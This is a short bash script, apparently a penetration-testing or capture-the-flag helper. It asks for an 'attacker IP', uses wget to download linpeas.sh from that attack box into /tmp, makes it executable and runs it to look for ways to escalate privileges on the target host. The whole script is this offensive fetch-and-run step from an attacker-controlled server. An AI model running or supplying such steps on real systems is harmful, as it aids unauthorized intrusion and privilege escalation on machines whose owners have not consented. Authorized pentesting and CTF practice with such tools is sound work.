#!/usr/bin/env bash
echo "[*] Downloading linpeas.sh from your attack box..."
read -p "Enter your attacker IP (HTTP server): " attacker_ip
wget http://$attacker_ip/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
echo "[*] Running linpeas..."
/tmp/linpeas.sh
